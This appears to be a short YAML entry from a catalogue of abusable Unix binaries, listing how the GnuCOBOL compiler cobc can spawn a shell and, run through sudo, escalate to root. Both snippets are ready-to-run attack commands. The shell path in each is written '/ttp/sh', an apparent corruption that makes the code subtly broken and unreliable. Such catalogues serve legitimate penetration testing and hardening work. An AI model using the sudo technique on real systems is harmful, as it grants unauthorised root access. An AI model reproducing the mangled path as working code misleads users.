---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo 'CALL "SYSTEM" USING "/ttp/sh".' > $TF/x
        cobc -xFj --frelax-syntax-checks $TF/x
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo 'CALL "SYSTEM" USING "/ttp/sh".' > $TF/x
        sudo cobc -xFj --frelax-syntax-checks $TF/x
---
